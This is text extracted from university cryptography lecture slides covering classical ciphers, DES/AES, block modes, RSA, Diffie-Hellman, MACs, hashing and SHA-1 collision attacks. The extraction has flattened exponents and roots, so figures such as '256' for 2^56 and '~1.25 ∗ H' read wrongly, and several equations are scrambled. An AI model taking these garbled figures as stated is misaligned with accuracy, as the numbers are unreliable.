+(in this case 9) or else the phrase will not be properly encoded; the height can thus be discovered
+by process of elimination if not known.
+--- Page 13 ---
+Rail Fence Cypher
+• To determine the puzzle width, which
+will tell us how many total units will be in
+each row, you must determine the
+"cycle" of letters.
+1
+L R
+• A "cycle" of letters runs from the top
+4
+1 I E P
+row, down through each subsequent row, 2
+2
+and then up again, but stopping before V
+3
+reaching the top row again. (The next
+letter on the top row will actually begin
+the next cycle.)
+• Our 3-rail puzzle has a "cycle" of 4 letters
+--- Page 14 ---
+• So, divide the total number of characters (letters + spaces) by the cycle length to determine
+how many complete zig-zag cycles occur in the message, rounding down: 9 / 4 = 2.25 (2)
+• KEY =3 Cycle =4
+LRLIEPOVO
+L 1 2 3 (4)R 1 2 3 (4)L
+IEPOVO
+L R L
+I E P O
+VO
+L R L
+I E P O
+V O
+--- Page 15 ---
+UETNVRIYIS
+Key=3
+Cycle must be 4
+UETNVRIYIS
+U E T
+NVRIYIS
+U E T
+N V R I Y
+IS
+U E T
+N V R I Y
+I S
+--- Page 16 ---
+Two remarks
+• Most modern algorithms include
+multiple stages of interleaving
+substitutions and transpositions;
+• The encryption uses a large
+complex key (unlike simple
+examples on the previous slides)
+--- Page 17 ---
+Cryptanalysis and
+computationally secure schemes
+• Cryptanalysis: The process of attempting to discover
+the plaintext or key;
+• Depends very much on the information available;
+• An encryption scheme is computationally secure if
+• The cost of breaking the scheme exceeds the
+value of the encrypted information;
+• The time required to break the scheme is more
+than lifetime of the information;
+--- Page 18 ---
+Types of
+Attacks
+(Cryptanalysis)
+Dependent on the
+information known
+an attacker has
+several options
+--- Page 19 ---
+If nothing else helps and there is no weakness
+in the encryption algorithms, brute-force
+approach may be applied;
+Try every possible key until correct translation
+Brute-Force
+of the encrypted text into plaintext is obtained;
+Approach in
+Cryptanalysis Possible issue: how does cryptanalyst
+recognize correct plaintext? Imagine it has
+been compressed before encryption;
+Main issue: time !!
+--- Page 20 ---
+A microsecond (μs) is an SI unit of time equal to one millionth (0.000001 or 10−6 or 1​ ⁄ ) of a second
+1,000,000
+Time required for brute-force search
+--- Page 21 ---
+One of the main goals when
+But making an algorithm
+creating new encryption
+easy to analyse can be
+algorithms is to make it as
+beneficial because:
+difficult as possible to break
+Analysis vs
+Cryptanalysis
+Understanding can
+Often simple provide a high level of
+algorithms provided trust – ensuring no
+the greatest security back doors or critical
+process flaws.
+--- Page 22 ---
+Block vs Stream
+Block cipher
+Stream cipher
+Input is blocks of elements – transformed to Process the elements continuously, one
+the output block all at once element at a time
+--- Page 23 ---
+• Most symmetric block algorithms have a
+structure similar to that proposed by
+H.Feistel in 1973
+• The input is divided into the blocks of
+even numbers of elements
+Feistel cipher
+• Then multiple stage of substitutions and
+transpositions are applied
+• Multiple keys (all derived from a master
+key) are used at the various rounds
+--- Page 24 ---
+Feistel network
+• Used all over cryptography
+• A frame-work for building cryptography
+• Does not have to be half and half exactly
+• (balanced or imbalanced cipher)
+• We take the RHS run it through a function and
+XOR with left and swap them over
+• We then repeat this
+--- Page 25 ---
+Decryption
+• Place the object to be decrypted back into
+the cipher and run the exact same process
+• (But with reversed keys -even one way
+hash / functions).
+--- Page 26 ---
+Block size – Larger block size = more secure – but slower
+Key size – Larger the size = more secure – but slower!
+Choices
+Number of rounds – more secure – but slower!
+Sub key generation algorithm – a more complex algorithm
+generally means more security – may or may not influence speed
+Round function – As above
+--- Page 27 ---
+DES (Data Encryption Standard)
+Symmetric
+Encryption
+3DES (Triple DES)
+Algorithms
+AES (Advanced Encryption
+Standard)
+--- Page 28 ---
+• Adopted in 1977 by the
+National Bureau of Standards (now NIST)
+• The Algorithm is DEA (Data encryption algorithm)
+DES
+• Blocks – 64 bits
+• Key – 56 bits
+• Rounds – 16
+• Sub keys – 16 (generated from master key)
+--- Page 29 ---
+• Keys are only 56 bits
+Weakness of
+• Whilst 256 is a large number computers can
+DEA easily brute force this now (first in mid 90s)
+• Solution: Increase the key size!
+--- Page 30 ---
+We do not know of a better way to attack
+this than brute force.
+Strengths
+And this is only possible (in a reasonable
+time frame) if we use a weak key.
+--- Page 31 ---
+3DES
+• All the power of DES but
+done 3 times
+• Separate key for each
+execution – this also
+means more sub keys
+--- Page 32 ---
+Designers: J.
+First published:
+Daemen, Vincent
+1998
+Rijmen
+Advanced
+A variant of
+Became effective as
+substitution-
+Encryption
+a NIST standard
+permutation
+May 2002
+network
+Standard
+Key size is 128, 192 Number of rounds is
+or 256 bits 10, 12, or 14
+--- Page 33 ---
+Design uses theory of finite fields, a
+branch of algebra;
+Advanced
+Every block of 128 bits is presented
+Encryption
+as 4 by 4 array of bytes
+Standard
+Key Expansion: Key → Round keys
+--- Page 34 ---
+• Every round includes the following steps:
+• Substituiton: each byte is replaced with another based on lookup table
+Steps in AES processing, I
+--- Page 35 ---
+• ShiftRows: each row is shifted cyclically certain amount of steps
+Steps in AES processing, II
+--- Page 36 ---
+MixColumns: mixing operation on the columns (defined in terms
+of computations in a finite field).
+Steps in AES processing, III
+--- Page 37 ---
+Steps in AES
+processing, IV
+AddRoundKey: each byte is
+combined with the round key
+--- Page 38 ---
+Considered secure for use for classified
+information, secret and top-secret level
+Security
+However, there are some concerns related to
+the algebraic foundations of algorithm –
+underlying algebraic structure might be used in
+of AES
+the attacks in some clever way
+The above is for Black Box setting; rather
+efficient Side Channels attacks have been
+discovered recently
+
+================================================================================
+LECTURE: COMP232-5-Crypto-Symmetric-2-26
+================================================================================
+
+--- Page 1 ---
+Symmetric Encryption
+Part 2
+--- Page 2 ---
+Block vs Stream
+Block cipher
+Stream cipher
+Input is blocks of elements – transformed to Process the elements continuously, one
+the output block all at once element at a time
+--- Page 3 ---
+Block
+• Block ciphers may be used in different
+modes. Most common modes are
+ciphers
+• Electronic Codebook Mode (ECB)
+• Cipher Block Chaining (CBC)
+modes
+• Cipher Feedback Mode (CFB)
+--- Page 4 ---
+• Simple mode: each block, say of size 64 bits is
+encrypted with the same key
+• For a given block of the plaintext and a given
+Electronic
+key the result of encryption is unique
+Codebook
+• If a block of plaintext is repeated several times,
+Mode (ECB)
+the result of encryption contains several copies
+of the same ciphertext
+• So, the encryption of the lengthy (regular)
+messages might be insecure
+--- Page 5 ---
+• CBC mode fixes abovementioned disadvantage
+of ECB mode: here the same blocks of plaintext
+may produce different blocks of ciphertext
+Cipher Block
+Chaining Mode • Simple idea: before encryption, a block of the
+plaintext is XOR’ed with the result of encryption
+of the previous block
+(CBC)
+𝐶 = 𝐸 𝐶 ⊕ 𝑃
+𝑖 𝐾 𝑖−1 𝑖
+• For the first block encryption some initialisation
+vector (IV) is used
+• It is better to keep both the key and IV secret
+--- Page 6 ---
+CBC encryption and decryption
+(a) Encryption
+(b) Decryption
+--- Page 7 ---
+• CFB mode may be used to transform a block
+cipher to the stream cipher
+Cipher Feedback
+• It has a parameter s (the size of transmission
+unit); if 8-bit characters are used as transmission
+Mode (CFB)
+unit, then s = 8
+• Shift register of size equal to the block-size of
+the block cipher is used (typically it is 64 bits)
+• Again, an initialisation vector (IV) is needed
+--- Page 8 ---
+s-bits CFB
+encryption
+&
+decryption
+--- Page 9 ---
+Key distribution
+• From requirements for symmetric encryption:
+• “Sender and receiver must have obtained copies
+of the secret key in a secure way and must keep
+the key secure”
+• Important issue: how to distribute secret keys?
+--- Page 10 ---
+• For two parties A and B:
+Key
+• A key could be created by A and delivered physically to
+distribution, B (or vice versa);
+manual
+• A key could be created by the third trusted party C and
+delivered physically to A and B;
+delivery
+• Difficult to use in wide area distributed systems, when
+dynamic connections are needed.
+--- Page 11 ---
+Key distribution,
+further techniques
+• If A and B have used recently a secret key, one of them
+could create a new secret key and send it to the partner
+using old key;
+• Potential problem: once an attacker learned one key,
+he can disclose all keys afterwards
+• There is a third trusted party C connected by encrypted
+channels with both A and B. Then C creates a key and
+distributes it among A and B using encrypted channels
+--- Page 12 ---
+Automated key
+distribution
+• FEP = Front End Processor
+• KDC = Key Distribution Center
+
+================================================================================
+LECTURE: COMP232-6-Public-key-26
+================================================================================
+
+--- Page 1 ---
+Public-Key Encryption
+--- Page 2 ---
+Public-key / Asymmetric Encryption
+Asymmetric encryption (or asymmetric key encryption):
+• One key is used for encryption (usually publicly known, public key);
+• Another key is used for decryption (usually private, or secret key)
+Alice and Bob agree on a public key algorithm.
+Alice sends Bob the public key. (or key is retrieved from a repository)
+Bob encrypts a message with Alice's public key and sends it to Alice.
+Alice decrypts Bob's message with the private key.
+--- Page 3 ---
+Public-key
+encryption
+--- Page 4 ---
+Plaintext
+Components
+Encryption algorithm (RSA / ECDSA / DSA / DH)
+of public-key
+Public and private key
+encryption
+Ciphertext
+Decryption algorithm
+--- Page 5 ---
+Public-key encryption
+Advantages
+• All keys (public and private) are generated locally
+• No need in secure distribution of the keys
+• Moreover, each user can change his own pair of
+public/private key at any time
+Disadvantages
+• It is more computationally expensive
+--- Page 6 ---
+Encryption/decryption:
+the sender encrypts a message with the
+recipient’s public key.
+Applications of
+Digital signature (authentication):
+Public-Key
+the sender “signs” the message with its
+private key; a receiver can verify the identity
+Cryptosystems of the sender using sender’s public key.
+Key exchange:
+both sender and receiver cooperate to
+exchange a (session) key.
+--- Page 7 ---
+Authentication
+using public-key
+systems
+--- Page 8 ---
+Only the private key holder can
+generate a message that can be
+decrypted by the public key
+RSA allows for
+verification
+A secure method of authenticating
+the owner of the private key is the
+person who sent the message
+--- Page 9 ---
+Two-way secure
+communication
+• A signs with A’s private key and then encrypts with B’s public key
+• This gives us authenticity because only A’s private key could
+have produced the signature
+• B’s private key is the only key that can unlock the other
+encryption
+• No one other than the owners of these two private keys
+could view this message
+• Any modification would invalidate the signature
+• Sign for authenticity, integrity. Encrypt for confidentiality.
+
+================================================================================
+LECTURE: COMP232-7-9-Algorithms-26
+================================================================================
+
+--- Page 1 ---
+A L G O R I T H M S
+R S A - D H - M A C
+--- Page 2 ---
+R S A P U B L I C - K E Y E N C R Y P T I O N
+A L G O R I T H M
+• One of the first, and probably best-known public-key scheme
+• It was developed in 1977 by R.Rivest, A.Shamir and L. Adleman
+• RSA is a block cipher in which the plaintext and ciphertext are
+integers between 0 and n-1
+• Every integer can be represented, of course, as a sequence of bits
+--- Page 3 ---
+Basic Math Concepts I
+• An integer 𝑛 ≥ 2 is said to be prime if the only divisors of 𝑛 are 1 and 𝑛.
+• Let 𝑎 and 𝑏 be integers (not both zero). The greatest common divisor of 𝑎 and 𝑏,
+denoted gcd(𝑎, 𝑏), is the largest integer that divides both 𝑎 and 𝑏. For example,
+gcd(4, 6) = 2, gcd(4, 9) = 1, gcd(15, 25) = 5
+• If gcd(𝑎, 𝑏) = 1, then we say that a and b are relatively prime.
+• Euclid’s algorithm is a method to find the gcd of two integers 𝑎 and 𝑏.
+• Theorem: If 𝑐 = gcd(𝑎, 𝑏), there exist integers 𝑥 and 𝑦 such that 𝑐 = 𝑥 · 𝑎 + 𝑦 · 𝑏
+For example, (−1,1), (−2,1), and (2, −1) in the examples above.
+--- Page 4 ---
+Basic Math Concepts II
+• One can modify Euclid’s algorithm to find these numbers 𝑥 𝑎𝑛𝑑 𝑦 while computing
+gcd(𝑎, 𝑏). This is the so-called “Extended Euclidean algorithm”.
+• For 𝑏 > 0, the modulo operator, denoted by 𝑎 mod 𝑏, defines the remainder 𝑟 of 𝑎
+when divided by 𝑏. In other words, 𝑟 is always an integer in the set {0, 1, 2, … 𝑏 − 1}.
+• Sometimes it is convenient to talk about congruence modulo 𝑛.
+If 𝑎 mod 𝑛 = 𝑏 mod 𝑛, we say that 𝑎 is congruent to 𝑏 modulo 𝑛 and write 𝑎 ≡ 𝑏 (mod 𝑛).
+For example, 27 𝑚𝑜𝑑 5 = 2, 12 𝑚𝑜𝑑 3 = 0, 91 𝑚𝑜𝑑 10 = 1
+--- Page 5 ---
+ENCRYPTION AND DECRYPTION IN RSA
+• Encryption: A message block 𝑀 < 𝑛 (represented as a number) is encrypted as
+𝑒
+𝐶 ≡ 𝑀 𝑚𝑜𝑑 𝑛
+• Decryption: To retrieve 𝑀, compute
+𝑑 𝑒 𝑑 𝑒𝑑
+𝑀 = 𝐶 𝑚𝑜𝑑 𝑛 = 𝑀 𝑚𝑜𝑑 𝑛 = 𝑀 𝑚𝑜𝑑 𝑛
+Here 𝑀 is a block of plaintext, 𝐶 is a block of a ciphertext, and e and d are some
+numbers. Sender and receiver know n and e. Only the receiver knows the value of d.
+--- Page 6 ---
+K E Y G E N E R A T I O N
+• Select two prime numbers p and q
+• Calculate 𝑛 = 𝑝 ∗ 𝑞
+• Calculate 𝜙 𝑛 = 𝑝 − 1 ∗ (𝑞 − 1)
+Select integer e less than 𝜙 𝑛 and relatively prime with 𝜙 𝑛
+•
+i.e., gcd(𝑒, 𝜙(𝑛)) = 1
+• Calculate 𝑑 such that: 𝑑𝑒 ≡ 1 𝑚𝑜𝑑 𝜙 𝑛
+(using the Extended Euclidean Algorithm: find integers 𝑥, 𝑦 such that 𝑒𝑥 + 𝜙 𝑛 𝑦 = 1,
+and 𝑑 is the modular inverse of 𝑒 modulo 𝜙 𝑛 )
+• Public key 𝐾𝑈 = 𝑒, 𝑛 and Private key 𝐾𝑅 = {𝑑, 𝑛}
+--- Page 7 ---
+FERMAT – EULER THEOREM
+𝑝−1
+Fermat’s Little Theorem: 𝑥 ≡ 1 𝑚𝑜𝑑 𝑝
+where 𝑝 is a prime number and 𝑥 ≠ 0 𝑚𝑜𝑑 𝑝
+Correctness of RSA can be proved
+using Fermat-Euler theorem:
+𝜙 𝑛
+𝑥 ≡ 1 𝑚𝑜𝑑 𝑛
+Where 𝑥 is relatively prime to 𝑛 ≥ 2.
+--- Page 8 ---
+Why Does Decryption Work?
+Using Key Relationship:
+Since 𝑑𝑒 ≡ 1 𝑚𝑜𝑑 𝜙(𝑛), we can express it as:
+𝑑𝑒 = 𝑘𝜙(𝑛) + 1 for some integer 𝑘
+Applying Fermat-Euler’s Theorem:
+𝑀𝜙(𝑛) ≡ 1 𝑚𝑜𝑑 𝑛, so we simplify:
+𝑘
+𝑑𝑒 𝑘𝜙 𝑛 +1 𝑘𝜙 𝑛 𝜙 𝑛 𝑘
+𝑀 ≡ 𝑀 ≡ 𝑀 ∗ 𝑀 ≡ 𝑀 ∗ 𝑀 ≡ 1 ∗ 𝑀 ≡ 𝑀 𝑚𝑜𝑑 𝑛
+Hence, decryption correctly retrieves the original message block 𝑀.
+--- Page 9 ---
+E X A M P L E
+• Select two prime numbers, 𝑝 = 17, 𝑞 = 11
+• Calculate 𝑛 = 𝑝𝑞 = 187
+• Calculate 𝜙 𝑛 = 16 ∗ 10 = 160
+• Select e less than 160 and relatively prime with 160, for example 7
+• Determine 𝑑 such that 𝑑𝑒 𝑚𝑜𝑑 160 = 1 and 𝑑 < 160
+• The correct value is 𝑑 = 23, indeed 23 ∗ 7 = 161 = 1 𝑚𝑜𝑑 160
+• Thus 𝐾𝑈 = {7,187} and 𝐾𝑅 = {23,187} in that case
+--- Page 10 ---
+E N C R Y P T I O N A N D D E C R Y P T I O N
+Let a plaintext be 𝑀 = 88; then encryption with a key {7,187} and
+decryption with a key {23,187} go as follows
+--- Page 11 ---
+H O W T O B R E A K R S A
+Brute-force approach: try all possible private
+keys of the size n.Too many of them even for
+moderate size of n.
+More specific approach: given a number n,try
+to find its two prime factors pand q;knowing
+these would allow us to find a private key easily.
+--- Page 12 ---
+S E C U R I T Y O F R S A
+Relies upon complexity of factoring problem
+Nobody knows how to factor the big numbers in
+the reasonable time (say, in the time polynomial in
+the size of (binary representation of) the number
+On the other-hand nobody has shown that the
+fast factoring is impossible
+--- Page 13 ---
+R S A C H A L L E N G E
+• RSA Laboratories to promote investigations in security of RSA
+put a challenge to factor big numbers (starting 1991)
+• Least number, not yet factored in that challenge is
+• RSA-260 =
+• 22112825529529666435281085255026230927612089502470015394413
+74831912882294140200198651272972656974659908590033003140005
+11707422045608592763579537571859542988389587092292384910067
+03034124620545784566413664540684214361293017694020846391065
+875914794251435144458199
+862 bits, or 260 decimal digits
+•
+--- Page 14 ---
+R S A C H A L L E N G E , R E C E N T N E W S (~2020)
+RSA-250 =
+2140324650240744961264423072839333563008614715144755017797754920881
+4180234471401366433455190958046796109928518724709145876873962619215
+5736304745477052080511905649310668769159001975940569345745223058932
+5976697471681738069364894699871578494975937497937
+=
+641352894770715802787901901705773890848250147429434472081168596
+32024532344630238623598752668347708737661925585694639798853367
+X
+3337202759497815655622601060535511422794076034476
+755466678452098702384172921003708025744867329688187756571898625
+8036932062711
+--- Page 15 ---
+H O W T O B R E A K R S A ( C O N T. )
+Common factors attack (2012):
+Due to insufficiently good random number generators used in key
+•
+generation, some number of keys used in the wild have common
+divisors - you can then factorize them using Euclid’s algorithm very
+fast. But it is not targeted.
+Shor’s factorization algorithm for quantum computers (near future?)
+•
+- requires a lot of “high-quality” universal qubits
+- era of post quantum cryptography
+--- Page 16 ---
+P O P U L A R
+Most Public Key Infrastructure (PKI) use RSA
+SSL/TLS: Certificates and Key-exchange
+Secure e-mail
+--- Page 17 ---
+D I F F I E - H E L L M A N K E Y
+E X C H A N G E
+--- Page 18 ---
+D I F F I E - H E L L M A N K E Y E X C H A N G E
+Most popular algorithm for key exchange is Diffie-Hellman algorithm (1976)
+The purpose of the algorithm is exchange of a secret key (not encryption)
+DH algorithm is considered as a public-key algorithm because:
+Users to generate the same secret key rely on publicly known information + some
+private information
+In principle, it is possible to generate a secret key knowing only public information,
+but it is computationally expensive
+--- Page 19 ---
+D I S C R E T E L O G A R I T H M S
+Security of DH algorithm relies upon difficulty of computing discrete logarithms.
+•
+It is relatively easy calculate exponentials modulo a prime,
+•
+𝑖
+that is given 𝑎, 𝑖, 𝑝: Calculate 𝑎 𝑚𝑜𝑑 𝑝
+It is very difficult, and for large primes infeasible, to calculate discrete logarithms,
+•
+𝑖
+that is given 𝑏, 𝑎, 𝑝: Find 𝑖 such that 𝑏 ≡ 𝑎 𝑚𝑜𝑑 𝑝
+--- Page 20 ---
+D I S C R E T E L O G A R I T H M S
+A number 𝑎 is called a primitive root if its powers generates all non-zero 𝑏 𝑚𝑜𝑑 𝑝,
+i.e., for every 0 < 𝑏 < 𝑝 we have 𝑎𝑖 ≡ 𝑏 𝑚𝑜𝑑 𝑝 for some integer 𝑖
+For example, 3 is a primitive root mod 7 but not 2
+Check 𝑎 = 3
+Check 𝑎 = 2
+31 = 3 ≡ 3 𝑚𝑜𝑑 7
+21 = 2 ≡ 2 𝑚𝑜𝑑 7
+32 = 9 ≡ 2 𝑚𝑜𝑑 7
+22 = 4 ≡ 4 𝑚𝑜𝑑 7
+33 = 27 ≡ 6 𝑚𝑜𝑑 7
+23 = 8 ≡ 1 𝑚𝑜𝑑 7
+34 = 81 ≡ 4 𝑚𝑜𝑑 7
+35 = 243 ≡ 5 𝑚𝑜𝑑 7
+Now it repeats:
+36 = 729 ≡ 1 𝑚𝑜𝑑 7
+24 ≡ 2, ; 25 ≡ 4, ; 26 ≡ 1 𝑚𝑜𝑑 7
+The set of residues produced is: {1,2,3,4,5,6}
+--- Page 21 ---
+D I F F I E - H E L L M A N K E Y E X C H A N G E
+Two publicly known numbers:
+•
+prime number 𝑞
+primitive root 𝛼 of 𝑞
+Let A and B wish to exchange a key, then they do the following:
+•
+A selects a random integer 𝑋 < 𝑞 and keeps it in secret
+𝐴
+B selects a random integer 𝑋 < 𝑞 and keeps it in secret
+𝐵
+--- Page 22 ---
+T H E S E C R E T K E Y
+• Exchange:
+𝑋
+A computes 𝑌 = 𝛼 𝐴 𝑚𝑜𝑑 𝑞 and sends it to B
+𝐴
+𝑋
+B computes 𝑌 = 𝛼 𝐵 𝑚𝑜𝑑 𝑞 and sends it to A
+𝐵
+Both A and B is now able to calculate common secret key:
+•
+A calculates 𝐾 = (𝑌 )𝑋 𝐴 𝑚𝑜𝑑 𝑞
+𝐵
+𝑋
+B calculates 𝐾 = (𝑌 ) 𝐵 𝑚𝑜𝑑 𝑞
+𝐴
+𝑋 𝑋
+• These calculations give identical results, and 𝐾 = 𝛼 𝐴 𝐵 𝑚𝑜𝑑 𝑞 is the common secret key.
+--- Page 23 ---
+D E F F I E –
+HELLMAN
+KEY
+E X C H A N G E
+--- Page 24 ---
+Neural Key Exchange
+Protocol (NKEP)
+What is NKEP?
+• A cryptographic key exchange method using neural
+networks.
+• Uses synchronization of neural networks instead of
+traditional math problems.
+How It Works:
+• Both parties initialize neural networks with random weights.
+• They process shared inputs to generate outputs.
+• Matching outputs lead to weight updates.
+• Iterations result in synchronized networks with identical
+weights (shared key).
+Pictures taken from the web.
+--- Page 25 ---
+NEURAL
+KEY
+E X C H A N G E
+--- Page 26 ---
+Advantages & Challenges of NKEP
+Advantages:
+• Potential resilience to quantum attacks.
+• Efficient and suitable for resource-constrained devices.
+• No reliance on complex mathematical problems.
+Challenges:
+• Some versions vulnerable to certain attacks.
+• Still in research phase with limited real-world use.
+--- Page 27 ---
+M A C - H A S H
+--- Page 28 ---
+M E S S A G E A U T H E N T I C A T I O N
+Message (or document) is authentic if
+•
+It is genuine (not altered)
+•
+came from its alleged source. (not delayed or replayed)
+•
+Message authentication is a procedure which verifies that
+•
+received messages are authentic
+--- Page 29 ---
+Aspects of Message Authentication
+We would like to ensure that
+• The content of the message has not been changed (integrity);
+• The source of the message is authentic (authenticity);
+• The source of the message can be proven by others (non-repudiation).
+--- Page 30 ---
+M E S S A G E A U T H E N T I C A T I O N
+T E C H N I Q U E S
+Using conventional message encryption:
+If we assume that only sender and receiver share a secret key then
+•
+the fact that receiver can successfully decrypt the message means the
+message has been encrypted by the sender
+Without message encryption:
+The message is not encrypted, but special authentication tag is
+•
+generated and appended to the message. Generation of a tag is a much
+more efficient procedure than encryption of the message.
+--- Page 31 ---
+M E S S A G E A U T H E N T I C A T I O N C O D E
+• Let A and B share a common secret key K
+• If A would like to send a message M to B, she calculates a message
+authentication code MAC of M using the key K
+MAC = F(K,M)
+• Then A appends MAC to M and sends all this to B
+• B applies the MAC algorithm to the received message and
+compares the result with the received MAC
+--- Page 32 ---
+M E S S A G E A U T H E N T I C A T I O N U S I N G M A C
+--- Page 33 ---
+M A C A L G O R I T H M S
+• The process of MAC generation is similar to the encryption;
+• The difference is
+- a MAC algorithm need not be reversible
+- easier to implement and less vulnerable to being broken;
+• Actually, standard encryption algorithms can be used for MAC generation:
+For example, a message may be encrypted with DES and then last 16 or 32
+bits of the encrypted text may be used as MAC (too wasteful)
+• HMAC-SHA256 is an example of MAC algorithms
+--- Page 34 ---
+O N E - W A Y H A S H F U N C T I O N S
+• Hash functions are important ingredient that can be used for
+authentication as a part of other mechanisms and protocols
+• The main difference with MAC is hash functions don’t use a secret key:
+h = H(M)
+“One-way” in the name refers to the property of such functions: they are
+easy to compute, but their reverse functions are very difficult to compute.
+--- Page 35 ---
+M E T H O D S O F
+A U T H E N T I C A T I ON
+U S I N G
+H A S H E S
+--- Page 36 ---
+H A S H F U N C T I O N R E Q U I R E M E N T S
+• To be suitable for message authentication, the hash functions must
+have ideally the following properties:
+• H can be applied to a block of data of any size;
+• H produces a fixed-length output;
+• H(x) is easy to compute for any given x;
+• For any value h it is very difficult (infeasible) to compute x
+such that H(x)=h (one-way property);
+• For any given x, it is very difficult (infeasible) to find y (not equal to x)
+such that H(x) = H(y); (weak collision resistance);
+• It is very difficult (infeasible) to find any pair (x,y) such that H(x) = H(y);
+(strong collision resistance).
+--- Page 37 ---
+S I M P L E H A S H F U N C T I O N
+Let the input be a sequence of n-bit blocks
+•
+Then simple hash function does bit-by-bit exclusive-OR (XOR) of every block
+•
+--- Page 38 ---
+S I M P L E H A S H F U N C T I O N
+Simple hash function does not satisfy the weak (and strong) collision property;
+•
+for any message M it is very easy to generate a message M1 such that h(M) = h(M1):
+•
+Take arbitrary message M2, compute h(M2) = h2 , then
+Add additional block to M2, such that for the resulting M3 we have h(M3) = h(M1).
+--- Page 39 ---
+Q U E S T I O N S
+• Which of the aspects:
+integrity, authenticity, non-repudiation
+the hash functions and discussed schemes do support?
+--- Page 40 ---
+T H E S H A - 1 S E C U R E H A S H A L G O R I T H M
+SHA-1 algorithm (1993-1995):
+Part of the sample program illustrating password-based encryption (practical sessions)
+Takes as input a message with a maximum length
+•
+64
+- less than 2 bits and produces as output a 160-bit message digest
+The input is processed in 512-bit blocks
+•
+Each bit of the output is computed using all bits of the input (diffusion)
+•
+--- Page 41 ---
+S H A - 1 G E N E R A L S C H E M E
+--- Page 42 ---
+S H A - 1 P R O C E S S I N G A S I N G L E B L O C K
+The compression function:
+• Includes 4 rounds with 20
+steps each;
+• Each round takes the
+current 512-bits block
+and 160-bits buffer value
+and updates the content
+of the buffer.
+--- Page 43 ---
+B I R T H D A Y A T T A C K
+Given a function f, how to find x and y such that f(x)= f(y) (collision)
+•
+Repeat until collision found: pick up two (pseudo) random inputs x and y, and
+•
+check if f(x)=f(y).
+Average number of steps needed ~1.25 ∗ 𝐻 where H is the number of different
+•
+values f(x) can take
+For example, if 𝐻 = 2160 then 𝐻 ~ 280 . So naively birthday attack on SHA-1
+•
+would take ~ 280 steps.
+--- Page 44 ---
+P R O B L E M S A N D S O L U T I O N S
+In 2005 a possible mathematical weakness of SHA-1 has been established:
+•
+~ 2000 time more efficient than brute force attack was found by Xiaoyun Wang
+(~269
+vs
+280
+)
+Further developments: SHA-2: (SHA-224,-256,-384,-512)
+•
+New competition for the new standard of hash functions by NIST:
+•
+- Deadline for submissions was 31.10.2008
+- New standard SHA-3 is announced a winner on 2nd October 2012; not a replacement, but
+alternative for SHA-2
+SHA-1 was deprecated as NIST standard in 2011 and disallowed for digital signatures in 2013.
+•
+--- Page 45 ---
+R E C E N T N E W S
+• SHAppening, October 2015 “freestart” collision attack
+(by M. Stevens, P, Karpman, T. Peyrin)
+~US $2000 of GPU time on EC2, est.
+(~257.5
+steps)
+• SHAttered, February 2017, full collision attack
+(by Google) ~ 6,500 years of CPU time
+(~269
+steps)
+• Chosen prefix attack, reported 2020,
+SHA-1 is a Shambles, by G. Leurent, T. Peyrin)
+https://sha-mbles.github.io
+https://sha-mbles.github.io
+Two months using 900 GPU (GTX 1060),
+63.4
+cost 75k USD, estimated rent cost 45k USD (2 steps)
